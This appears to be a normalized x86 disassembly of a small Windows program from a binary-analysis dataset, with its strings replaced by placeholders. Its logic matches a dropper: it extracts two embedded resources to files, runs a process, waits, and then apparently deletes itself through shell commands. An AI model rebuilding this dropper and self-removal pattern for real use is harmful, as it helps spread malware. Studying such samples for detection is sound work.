sub_401000
sub esp 0x30c
lea eax [ esp + 0x208 ]
push esi
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea ecx [ esp + 0x108 ]
push 0x104
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x108 ]
push 0x104
lea eax [ esp + 0x10c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x108 ]
lea eax [ esp + 0x4 ]
push edx
push eax
call esi
lea ecx [ esp + 0x4 ]
push rw-data
push ecx
call esi
mov esi [ ShellExecuteA@IAT ]
push 0x0
push rw-data
lea edx [ esp + 0x214 ]
push rw-data
push edx
push rw-data
push 0x0
call esi
push 0x0
push rw-data
lea eax [ esp + 0x214 ]
push rw-data
push eax
push rw-data
push 0x0
call esi
push 0x0
lea ecx [ esp + 0x8 ]
push 0x0
lea edx [ esp + 0x214 ]
push ecx
push edx
push 0x0
push 0x0
call esi
xor eax eax
pop esi
add esp 0x30c
retn
sub_4010f0
sub esp 0x84
push ebx
push ebp
push esi
push edi
push 0x0
call [ GetModuleHandleA@IAT ]
mov ecx [ esp + 0x98 ]
mov esi eax
mov eax [ esp + 0x9c ]
and ecx 0xffff
push eax
push ecx
push esi
call [ FindResourceA@IAT ]
mov edi eax
push edi
push esi
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
push edi
push esi
mov ebx eax
call [ SizeofResource@IAT ]
mov ebp eax
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] 0x0
lea edx [ esp + 0x14 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0xa0 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0xa4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx edx
push eax
shr ecx 0x2
[ edi ] [ esi ]
push 0x80
push 0x2
mov ecx edx
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x28 ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
mov esi eax
push ebp
push ebx
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x84
retn
sub_401220
sub esp 0x358
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x69 ]
mov [ esp + 0x68 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x169 ]
mov [ esp + 0x168 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x269 ]
mov [ esp + 0x268 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x268 ]
push eax
push ecx
mov [ esp + 0x18 ] 0x100
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x168 ]
push 0x80
push edx
call [ GetWindowsDirectoryA@IAT ]
mov al [ esp + 0x168 ]
mov cl [ esp + 0x169 ]
mov [ rw-data ] al
mov [ rw-data ] cl
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x268 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ] [ esi ]
mov ecx 0x40
mov esi rw-data
lea edi [ esp + 0x70 ]
push rw-data
[ edi ] [ esi ]
push 0x65
call sub_4010f0
push rw-data
push rw-data
push rw-data
push 0x66
call sub_4010f0
mov ebp [ Sleep@IAT ]
add esp 0x20
push 0x7d0
call ebp
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x24 ]
lea edx [ esp + 0x68 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x54 ] ax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x6c ]
push ecx
push rw-data
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x78 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
mov eax [ esp + 0x14 ]
push 0xffffffff
push eax
setne bl
call [ WaitForSingleObject@IAT ]
test bl bl
je r-xdata
push 0x1388
call ebp
call sub_401000
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x358
retn
mov ecx [ esp + 0x18 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401571
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40155c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
call [ __p___initenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
call sub_401220
add esp 0x30
mov [ ebp - 0x24 ] eax
push eax
call [ exit@IAT ]
push sub_40156e
call [ __setusermatherr@IAT ]
pop ecx
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40155c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40156e
xor eax eax
retn
sub_401571
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
